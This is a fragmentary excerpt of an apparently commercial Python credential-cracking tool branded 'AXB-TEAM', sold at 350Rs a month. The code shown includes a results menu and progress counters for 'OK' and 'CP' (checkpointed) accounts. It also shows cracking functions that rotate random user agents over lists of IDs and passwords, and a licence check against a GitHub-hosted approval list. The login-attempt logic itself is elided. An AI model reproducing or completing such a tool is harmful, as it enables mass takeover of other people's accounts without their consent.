...
def banner():
	 ...
	 \x1b[92;1mTHIS TOOL CRATE BY A Z A N ''')
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'>> 1. AXB-TEAM {h}OK{x} Anda ')
	print(f'>> 2. AXB-TEAM {k}CP{x} Anda ')
	print('>> 3. EXIT	')
	kz = input(f'\n>> Pilih : ')
	if kz in ['2']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ AXB-TEAM ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[ AXB-TEAM ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{P})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
def xoshnaw():
  os.system('clear')
  os.system('figlet AXB')
  print ('\x1b[92;1m\tYOUR ID IS NOT YET APPROVED\n')
  print('\r        TOOL PRICE 350Rs | 1 MONTH\n')
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  print("\x1b[37;1m     YOUR ID : "+id)
  try:
    httpCaht = requests.get('https://github.com/Mr-Azan/F9/blob/main/Aproval.text').text
    if id in httpCaht:
      ...
      os.system('xdg-open https://wa.me/+923165456679?text=ADMIN+PLEASE+APPROVE+MY+ID+LICENSI+NUMBER')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
